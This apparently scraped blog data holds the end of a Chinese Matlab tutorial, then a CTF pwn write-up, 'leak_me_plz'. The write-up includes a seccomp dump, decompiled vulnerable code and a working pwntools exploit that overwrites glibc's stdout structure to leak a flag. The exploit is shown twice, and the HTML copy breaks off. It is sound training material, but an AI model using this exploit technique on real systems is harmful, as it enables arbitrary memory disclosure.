title=\"Matlab的数据类型\"></a>Matlab的数据类型</h2><ul>\n<li>数字</li>\n<li>字符和字符串</li>\n<li>矩阵</li>\n<li>元胞数组</li>\n<li>结构体</li>\n</ul>\n<h3 id=\"数字\"><a href=\"#数字\" class=\"headerlink\" title=\"数字\"></a>数字</h3><p>单纯的数字</p>\n<p>随机数：rand，randi，randn</p>\n<ul>\n<li>rand([randstream,]m,n[,precision])生成m到n的随机数，默认为0到1；可以指定种子和精度</li>\n<li>randi([iMin,iMax],m,n)在开区间(iMin,iMax)生成m * n的随机整数矩阵</li>\n<li>randn()生成标准正态分布的随机数，可以指定均值和方差</li>\n</ul>\n<h3 id=\"字符和字符串\"><a href=\"#字符和字符串\" class=\"headerlink\" title=\"字符和字符串\"></a>字符和字符串</h3><p>字符串，用**单引号’   ‘**表示</p>\n<p>采用ascii码，有length函数和num2str函数，char函数等</p>\n<h3 id=\"矩阵\"><a href=\"#矩阵\" class=\"headerlink\" title=\"矩阵\"></a>矩阵</h3><p>矩阵使用<strong>中括号[]<strong>括起来表示，使用</strong>回车或分号;<strong>去划分矩阵的每一行，使用</strong>空格 或逗号,<strong>去划分矩阵一行中的每一个元素。要注意的是，</strong>矩阵中的每一行的元素个数都要相同</strong>。</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">matrix = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>;<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>;<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>]</span><br><span class=\"line\">matrix = [<span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span>;<span class=\"number\">4</span> <span class=\"number\">5</span> <span class=\"number\">6</span>;<span class=\"number\">7</span> <span class=\"number\">8</span> <span class=\"number\">9</span>]</span><br><span class=\"line\">相当于矩阵：</span><br><span class=\"line\">[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span></span><br><span class=\"line\"> <span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span></span><br><span class=\"line\"> <span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>]</span><br></pre></td></tr></table></figure>\n\n<p>矩阵中使用**单引号’**表示转置</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">matrix = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>;<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>;<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>]</span><br><span class=\"line\">matrixT = matrix&#x27; <span class=\"comment\">% matrixT是matrix的转置矩阵</span></span><br><span class=\"line\">matrixT = [<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">7</span></span><br><span class=\"line\">\t\t  <span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">8</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">3</span>,<span class=\"number\">6</span>,<span class=\"number\">9</span>]</span><br></pre></td></tr></table></figure>\n\n<p>矩阵中使用(:)将矩阵降维拉伸</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">matrix = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>;<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>;<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>]</span><br><span class=\"line\">matrixL = matrix(:) <span class=\"comment\">% matrixT是matrix的转置矩阵</span></span><br><span class=\"line\">matrixL = [<span class=\"number\">1</span></span><br><span class=\"line\">\t\t  <span class=\"number\">4</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">7</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">2</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">5</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">8</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">3</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">6</span></span><br><span class=\"line\"> \t\t  <span class=\"number\">9</span>]</span><br></pre></td></tr></table></figure>\n\n<p>矩阵的逆矩阵，使用函数inv求得：</p>\n<p>inv(A)求得矩阵A的逆矩阵（A*inv(A)=inv(A)*A=I（单位矩阵））</p>\n<p>除了使用[]之外，还有许多方法可以创建矩阵</p>\n<ol>\n<li>使用num1:num2获取一行的矩阵，之后使用reshape(矩阵，行数，列数)改变shape</li>\n<li>使用num1:num2获取一行的矩阵，之后使用diag函数创建对角矩阵（元素都在对角线上）</li>\n<li>从文件中导入</li>\n<li>从矩阵运算中得到</li>\n<li>使用创建矩阵的函数（指定行、列和维度（可选）），eye()创建单位矩阵，zeros()创建0矩阵，ones()创建1矩阵，rand()创建随机元素的矩阵，size()可以获取矩阵的行和列用于辅助，length()可以获取向量的长度</li>\n<li>magic(n)函数生成n阶幻方，横竖斜的n个元素之和都相等</li>\n<li>repmat(x,m,n)将矩阵行重复m次，列重复n次</li>\n</ol>\n<p>矩阵的索引操作：</p>\n<p>使用**(行，列，维度)<strong>进行索引，可以使用:进行切片，需要注意的是，</strong>Matlab中的索引是从1开始的**，并且索引不能为负数</p>\n<p>find(condition)函数可以返回矩阵中满足条件的值的下标，如find(A&gt;20)可以返回矩阵A中&gt;20的值的下标</p>\n<p>冒号:可以用来生成等差数列，<strong>第一项:公差（步长）:最后一项</strong></p>\n<h3 id=\"元胞数组\"><a href=\"#元胞数组\" class=\"headerlink\" title=\"元胞数组\"></a>元胞数组</h3><p>相当于python中的list，<strong>可以容纳不同类型元素的数组</strong>。</p>\n<p>元胞数组的创建：</p>\n<p>使用cell(m,n)创建一个m行*n列的元胞数组，元胞数组使用**大括号{}**进行索引</p>\n<h3 id=\"结构体\"><a href=\"#结构体\" class=\"headerlink\" title=\"结构体\"></a>结构体</h3><p>使用struct()进行创建，采用键值对表示数据</p>\n<h2 id=\"程序流程控制\"><a href=\"#程序流程控制\" class=\"headerlink\" title=\"程序流程控制\"></a>程序流程控制</h2><p>Matlab本身会由上到下按顺序执行语句</p>\n<h3 id=\"循环\"><a href=\"#循环\" class=\"headerlink\" title=\"循环\"></a>循环</h3><figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> 循环变量=初值[:步长]:终值</span><br><span class=\"line\">\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> 条件表达式</span><br><span class=\"line\">\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> 条件表达式</span><br><span class=\"line\">\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">switch</span> 表达式（数字或字符）</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> 数字或字符</span><br><span class=\"line\">\t\t执行语句</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"keyword\">otherwise</span></span><br><span class=\"line\">\t\t执行语句</span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"绘图\"><a href=\"#绘图\" class=\"headerlink\" title=\"绘图\"></a>绘图</h2><p>类似plt</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x=...</span><br><span class=\"line\">y=...</span><br><span class=\"line\"><span class=\"built_in\">figure</span> <span class=\"comment\">% 建立一个幕布</span></span><br><span class=\"line\"><span class=\"built_in\">plot</span>(x,y)</span><br><span class=\"line\">title(<span class=\"string\">&#x27;...&#x27;</span>) <span class=\"comment\">% 设置标题</span></span><br><span class=\"line\">xlabel(<span class=\"string\">&#x27;...&#x27;</span>) <span class=\"comment\">% 设置x坐标</span></span><br><span class=\"line\">ylabel(<span class=\"string\">&#x27;...&#x27;</span>) <span class=\"comment\">% 设置y坐标</span></span><br><span class=\"line\">xlim([xMin xMax]) <span class=\"comment\">% 限制坐标轴的范围</span></span><br><span class=\"line\"></span><br><span class=\"line\">plotyy()<span class=\"comment\">% 可以在一个x坐标中绘制多条曲线</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"程序设计\"><a href=\"#程序设计\" class=\"headerlink\" title=\"程序设计\"></a>程序设计</h2><p>Matlab语言编写的程序称为M文件，共有命令文件和函数文件两类</p>\n<ul>\n<li>命令文件：没有输入参数，不返回输出参数</li>\n<li>函数文件：可以输入参数，也可以返回输出参数</li>\n</ul>\n<p>每一个函数文件定义一个函数，函数文件由于function语句引导，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function 输出形参表=函数名(输入形参表)</span><br><span class=\"line\">函数体</span><br></pre></td></tr></table></figure>\n\n<p>当输出形参多于1个的时候应该用[]括起来</p>"},{"title":"leak_me_plz","date":"2023-03-19T11:15:21.000Z","_content":"\nNewStar CTF Week5的题，利用stdout进行任意读。这题主要是想让一些同学了解打 Stdout 不只局限在低字节写 `\\x00` 来 leak libc，有时候我们可以利用这个来 leak `environ`拿栈地址打栈，leak `fskey` 打 `_IO_cookie_write`(House of Emma) ...\n\n<!--more-->\n\n查壳，保护全开\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/leak_me_plz/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n开了沙箱\n\n```sh\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x06 0x00 0x40000000  if (A >= 0x40000000) goto 0010\n 0004: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0009\n 0005: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0009\n 0006: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0009\n 0007: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0009\n 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010\n 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0010: 0x06 0x00 0x00 0x00000000  return KILL\n\n```\n\n不能`execve`而且`orw`缺`w`。\n\n程序比较简单。\n\n在init函数中进行初始化并在0x233000的位置分配了一块大小为`0x1000`的RW的内存，并且在get_flag中已经将flag写入到其中了，只需要将其读出即可知道flag。\n\n漏洞在vuln函数中\n\n```c\nvoid __noreturn vuln()\n{\n  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF\n\n  buf[1] = (void *)__readfsqword(0x28u);\n  buf[0] = 0LL;\n  puts(\"Hiiii!My beeest friend.So glad that you come again.This time you need to read the flag.\");\n  printf(\"Here is your gift: %p\\nGood luck!\\n\", &puts);\n  printf(\"Addr: \");\n  read(0, buf, 8uLL);\n  printf(\"Data: \");\n  read(0, buf[0], 0x38uLL);\n  puts(\"Did you get that?\");\n  _exit(0);\n}\n```\n\n开始会泄露出puts的地址，可以得到libcbase，之后会有一次任意写0x38byte的机会。\n\n在read后面有一个puts语句，可以尝试修改`_IO_2_1_stdout_`的`flag`、`write_base`和`write_ptr`实现任意读来将`flag`输出出来，还要设置`write_ptr==write_end`来避免在全缓冲模式下计算的count>0(详情看源码，明明puts是以行缓冲模式计算的，不知道为何不设置的话无法输出)。\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('./libc-2.31.so')\np=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\nru(\"Here is your gift: \")\nlibcbase=int(ru('\\n')[2:-1],16)-libc.sym['puts']\nru('Good luck!\\n')\n\nstdout=libcbase+libc.sym['_IO_2_1_stdout_']\n\nru(\"Addr: \")\npayload=p64(stdout)\n\nleak('libcbase: ',hex(libcbase))\nleak('stdout: ',hex(stdout))\ndebug()\ns(payload)  \n\nru(\"Data: \")\npayload=p64(0xfbad1800)+p64(0)*3+p64(0x233000)+p64(0x233040)+p64(0x233040)\n\ns(payload)\n\nitr()\n```\n\n","source":"_posts/NewStar-leak_me_plz.md","raw":"---\ntitle: leak_me_plz\ndate: 2023-03-19 19:15:21\ncategories: \n- pwn_wp\ntags: \n- pwn\n- IO_FILE\n\n---\n\nNewStar CTF Week5的题，利用stdout进行任意读。这题主要是想让一些同学了解打 Stdout 不只局限在低字节写 `\\x00` 来 leak libc，有时候我们可以利用这个来 leak `environ`拿栈地址打栈，leak `fskey` 打 `_IO_cookie_write`(House of Emma) ...\n\n<!--more-->\n\n查壳，保护全开\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/leak_me_plz/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n开了沙箱\n\n```sh\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x06 0x00 0x40000000  if (A >= 0x40000000) goto 0010\n 0004: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0009\n 0005: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0009\n 0006: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0009\n 0007: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0009\n 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010\n 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0010: 0x06 0x00 0x00 0x00000000  return KILL\n\n```\n\n不能`execve`而且`orw`缺`w`。\n\n程序比较简单。\n\n在init函数中进行初始化并在0x233000的位置分配了一块大小为`0x1000`的RW的内存，并且在get_flag中已经将flag写入到其中了，只需要将其读出即可知道flag。\n\n漏洞在vuln函数中\n\n```c\nvoid __noreturn vuln()\n{\n  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF\n\n  buf[1] = (void *)__readfsqword(0x28u);\n  buf[0] = 0LL;\n  puts(\"Hiiii!My beeest friend.So glad that you come again.This time you need to read the flag.\");\n  printf(\"Here is your gift: %p\\nGood luck!\\n\", &puts);\n  printf(\"Addr: \");\n  read(0, buf, 8uLL);\n  printf(\"Data: \");\n  read(0, buf[0], 0x38uLL);\n  puts(\"Did you get that?\");\n  _exit(0);\n}\n```\n\n开始会泄露出puts的地址，可以得到libcbase，之后会有一次任意写0x38byte的机会。\n\n在read后面有一个puts语句，可以尝试修改`_IO_2_1_stdout_`的`flag`、`write_base`和`write_ptr`实现任意读来将`flag`输出出来，还要设置`write_ptr==write_end`来避免在全缓冲模式下计算的count>0(详情看源码，明明puts是以行缓冲模式计算的，不知道为何不设置的话无法输出)。\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('./libc-2.31.so')\np=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\nru(\"Here is your gift: \")\nlibcbase=int(ru('\\n')[2:-1],16)-libc.sym['puts']\nru('Good luck!\\n')\n\nstdout=libcbase+libc.sym['_IO_2_1_stdout_']\n\nru(\"Addr: \")\npayload=p64(stdout)\n\nleak('libcbase: ',hex(libcbase))\nleak('stdout: ',hex(stdout))\ndebug()\ns(payload)  \n\nru(\"Data: \")\npayload=p64(0xfbad1800)+p64(0)*3+p64(0x233000)+p64(0x233040)+p64(0x233040)\n\ns(payload)\n\nitr()\n```\n\n","slug":"NewStar-leak_me_plz","published":1,"updated":"2023-03-19T13:09:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafd001d5oud6ggk2yqm","content":"<p>NewStar CTF Week5的题，利用stdout进行任意读。这题主要是想让一些同学了解打 Stdout 不只局限在低字节写 <code>\\x00</code> 来 leak libc，有时候我们可以利用这个来 leak <code>environ</code>拿栈地址打栈，leak <code>fskey</code> 打 <code>_IO_cookie_write</code>(House of Emma) …</p>\n<span id=\"more\"></span>\n\n<p>查壳，保护全开</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NewStar/leak_me_plz/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>开了沙箱</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x08 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x06 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto 0010</span><br><span class=\"line\"> 0004: 0x15 0x04 0x00 0x00000000  <span class=\"keyword\">if</span> (A == <span class=\"built_in\">read</span>) goto 0009</span><br><span class=\"line\"> 0005: 0x15 0x03 0x00 0x00000001  <span class=\"keyword\">if</span> (A == write) goto 0009</span><br><span class=\"line\"> 0006: 0x15 0x02 0x00 0x00000003  <span class=\"keyword\">if</span> (A == close) goto 0009</span><br><span class=\"line\"> 0007: 0x15 0x01 0x00 0x0000000c  <span class=\"keyword\">if</span> (A == brk) goto 0009</span><br><span class=\"line\"> 0008: 0x15 0x00 0x01 0x000000e7  <span class=\"keyword\">if</span> (A != exit_group) goto 0010</span><br><span class=\"line\"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0010: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>不能<code>execve</code>而且<code>orw</code>缺<code>w</code>。</p>\n<p>程序比较简单。</p>\n<p>在init函数中进行初始化并在0x233000的位置分配了一块大小为<code>0x1000</code>的RW的内存，并且在get_flag中已经将flag写入到其中了，只需要将其读出即可知道flag。</p>\n<p>漏洞在vuln函数中</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __noreturn <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *buf[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  buf[<span class=\"number\">1</span>] = (<span class=\"type\">void</span> *)__readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  buf[<span class=\"number\">0</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Hiiii!My beeest friend.So glad that you come again.This time you need to read the flag.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Here is your gift: %p\\nGood luck!\\n&quot;</span>, &amp;<span class=\"built_in\">puts</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Addr: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf[<span class=\"number\">0</span>], <span class=\"number\">0x38</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Did you get that?&quot;</span>);</span><br><span class=\"line\">  _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>开始会泄露出puts的地址，可以得到libcbase，之后会有一次任意写0x38byte的机会。</p>\n<p>在read后面有一个puts语句，可以尝试修改<code>_IO_2_1_stdout_</code>的<code>flag</code>、<code>write_base</code>和<code>write_ptr</code>实现任意读来将<code>flag</code>输出出来，还要设置<code>write_ptr==write_end</code>来避免在全缓冲模式下计算的count&gt;0(详情看源码，明明puts是以行缓冲模式计算的，不知道为何不设置的话无法输出)。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Here is your gift: &quot;</span>)</span><br><span class=\"line\">libcbase=<span class=\"built_in\">int</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">2</span>:-<span class=\"number\">1</span>],<span class=\"number\">16</span>)-libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;Good luck!\\n&#x27;</span>)</span><br><span 